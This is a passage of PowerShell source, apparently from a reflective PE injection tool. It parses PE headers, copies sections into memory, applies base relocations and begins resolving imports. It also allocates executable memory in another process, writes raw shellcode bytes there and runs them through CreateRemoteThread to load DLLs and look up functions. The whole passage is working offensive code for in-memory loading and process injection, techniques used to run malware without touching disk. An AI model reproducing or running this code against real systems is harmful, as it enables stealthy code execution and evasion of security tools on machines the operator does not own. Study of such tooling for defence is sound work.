		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		#Write FunctionName to memory (will be used in GetProcAddress)
		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		#todo: need to have detection for when to get by ordinal
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
